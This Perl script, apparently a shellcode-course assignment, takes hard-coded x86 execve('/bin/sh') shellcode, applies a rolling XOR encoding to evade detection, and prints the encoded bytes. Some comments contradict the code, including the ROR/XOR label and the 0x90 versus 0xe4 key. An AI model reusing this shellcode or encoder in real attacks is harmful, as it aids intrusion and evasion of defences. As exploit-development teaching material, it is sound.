#Author: John Stigerwalt
#Program Function: Takes shellcode and encodes with ROR Rolling Encoder
#SLAE Assignment #4
#
#Note: Rolling XOR Encoder
#
#shellcode: db 0xd5, 0x15, 0x45, 0x2d, 0x2, 0x2d, 0x5e, 0x36, 0x5e, 0x71, 0x13, 0x7a, 0x14, 0x9d, 0x7e, 0x2e, 0xa7, 0x45, 0x16, 0x9f, 0x7e, 0xce, 0xc5, 0x8, 0x88
# Orginal Shellcode
$code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

#Set Value and convert to Hex using unpack
$secret = "\x90";
$key = "0xe4";
print "\n"."---------------------------------"."\n";
print "Using Rolling XOR Encoding"."\n";

# use hex of $code
$hexcode = unpack("H*",$code);
$hexlen = length($code);

print "[+] Hex code: ".$hexcode."\n";
print "Hex Length: ".$hexlen."\n";
print "---------------------------------"."\n";

@org;

for ($i=0;$i<$hexlen;$i++) {
	
	 $encoded = unpack("H*", substr($code,$i,1));
	 #$tmp = "0x" . $encoded;
	 push @org, $encoded;
	 
}

# Setup Array for XOR
@shell;
@out;
$b = hex $key;
print "First XOR Key = ".$b."\n";
push @out, $b;	# push 0x90 to array. - first byte of xor process

foreach $x (@org) {
	
	$y = hex $x;
	
	$a = $y ^ $out[$#out];
	
	push @out, $a;
	
	$z = sprintf("%x", $a);
	$fx = "0x" . $z . ",";
	push @shell, $fx;
	
	
}

$last = $out[$#out];
$r = sprintf("%x", $last);
$cv = "0x" . $r . ",";
print "Last Key of Array: ".$cv."\n";
print @shell;
